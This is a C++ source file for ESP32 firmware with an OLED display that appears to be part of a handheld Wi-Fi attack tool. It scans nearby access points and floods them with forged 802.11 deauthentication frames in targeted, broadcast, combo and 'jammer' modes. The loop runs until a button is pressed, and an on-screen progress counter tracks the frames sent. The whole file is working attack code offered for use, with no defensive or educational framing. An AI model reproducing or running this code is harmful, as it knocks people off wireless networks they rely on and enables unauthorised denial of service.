#include "esp_wifi.h"
#include "wifi_deauth.h"
#include "tool_state.h"
#include "display_common.h"
#include "wifi_common.h"
#include <cstdio>
#include <cstring>

static void show_deauth_progress_frame(const char *text, uint32_t sent_count, uint8_t phase)
{
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);

    draw_centered_text(text, 10, 1, false, false);

    const int bar_x = 14;
    const int bar_y = 32;
    const int bar_w = 100;
    const int bar_h = 10;

    display.drawRect(bar_x, bar_y, bar_w, bar_h, SSD1306_WHITE);
    int fill_width = ((phase + 1) * (bar_w - 2)) / 3;
    display.fillRect(bar_x + 1, bar_y + 1, fill_width, bar_h - 2, SSD1306_WHITE);

    char count_text[24];
    snprintf(count_text, sizeof(count_text), "%lu sent", static_cast<unsigned long>(sent_count));
    draw_centered_text(count_text, 48, 1, false, false);

    for (uint8_t i = 0; i < 3; i++)
    {
        int x = 52 + (i * 12);
        if (((phase + i) % 3) == 0)
        {
            display.fillCircle(x, 58, 2, SSD1306_WHITE);
        }
        else
        {
            display.drawCircle(x, 58, 2, SSD1306_WHITE);
        }
    }

    display.display();
}

static bool parse_bssid(const char *bssid_str, uint8_t out[6])
{
    if (bssid_str == nullptr)
    {
        return false;
    }

    unsigned int b0, b1, b2, b3, b4, b5;
    int parsed = sscanf(
        bssid_str,
        "%02X:%02X:%02X:%02X:%02X:%02X",
        &b0, &b1, &b2, &b3, &b4, &b5);

    if (parsed != 6)
    {
        return false;
    }

    out[0] = static_cast<uint8_t>(b0);
    out[1] = static_cast<uint8_t>(b1);
    out[2] = static_cast<uint8_t>(b2);
    out[3] = static_cast<uint8_t>(b3);
    out[4] = static_cast<uint8_t>(b4);
    out[5] = static_cast<uint8_t>(b5);
    return true;
}

void _send_deauth_frame_to_ap(uint8_t ap_addr[], uint8_t target_addr[])
{
    memcpy(&deauthPacket[10], ap_addr, 6);
    memcpy(&deauthPacket[16], ap_addr, 6);
    memcpy(&deauthPacket[4], target_addr, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void _broadcast_send_deauth_frame(uint8_t ap_addr[], uint8_t target_addr[])
{
    (void)target_addr;
    memcpy(&deauthPacket[10], ap_addr, 6);
    memcpy(&deauthPacket[16], ap_addr, 6);
    memcpy(&deauthPacket[4], broadcastAddress, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bool safe_mode, bool jammer_mode)
{
    init_wifi();
    scan_wifi("Scanning targets", random_mac, burst_mode, safe_mode);

    if (scanned_network_count <= 0)
    {
        show_task_progress_frame("No target AP found", 100, 0, false);
        delay(450);
        disable_wifi();
        return;
    }

    uint8_t phase = 0;
    uint32_t sent_count = 0;
    uint8_t target_addr[6];
    uint8_t target_count = static_cast<uint8_t>(scanned_network_count > MAX_NETWORKS ? MAX_NETWORKS : scanned_network_count);
    uint8_t repeats_per_target = burst_mode ? 3 : 1;
    if (jammer_mode)
    {
        repeats_per_target += 2;
    }
    if (safe_mode && repeats_per_target > 1)
    {
        repeats_per_target = 1;
    }

    uint16_t send_delay = 85;
    if (safe_mode)
    {
        send_delay = 170;
    }
    else if (jammer_mode)
    {
        send_delay = 35;
    }

    if (strcmp(attack_type, "targeted_deauth") == 0)
    {
        target_count = 1;
    }

    while (true)
    {
        if (is_menu_pressed || is_home_pressed || is_select_pressed || is_movefd_pressed || is_movebd_pressed)
        {
            break;
        }

        for (uint8_t idx = 0; idx < target_count; idx++)
        {
            if (!parse_bssid(networks[idx].bssid, target_addr))
            {
                continue;
            }

            if (networks[idx].channel > 0)
            {
                esp_wifi_set_channel(networks[idx].channel, WIFI_SECOND_CHAN_NONE);
            }

            for (uint8_t rep = 0; rep < repeats_per_target; rep++)
            {
                if (strcmp(attack_type, "targeted_deauth") == 0)
                {
                    _send_deauth_frame_to_ap(target_addr, broadcastAddress);
                    sent_count++;
                }
                else if (strcmp(attack_type, "combo_deauth") == 0)
                {
                    _send_deauth_frame_to_ap(target_addr, broadcastAddress);
                    _broadcast_send_deauth_frame(target_addr, broadcastAddress);
                    sent_count += 2;
                }
                else
                {
                    _broadcast_send_deauth_frame(target_addr, broadcastAddress);
                    sent_count++;
                }
            }
        }

        phase = (phase + 1) % 3;
        show_deauth_progress_frame("Sending DE-AUTH Frames", sent_count, phase);
        delay(send_delay);
    }

    if (strcmp(attack_type, "targeted_deauth") == 0)
    {
        show_task_progress_frame("Targeted DE-AUTH stopped", 100, phase, false);
    }
    else
    {
        show_task_progress_frame("Broadcast DE-AUTH stopped", 100, phase, false);
    }

    delay(350);
    is_menu_pressed = false;
    is_home_pressed = false;
    is_select_pressed = false;
    is_movefd_pressed = false;
    is_movebd_pressed = false;
    disable_wifi();
}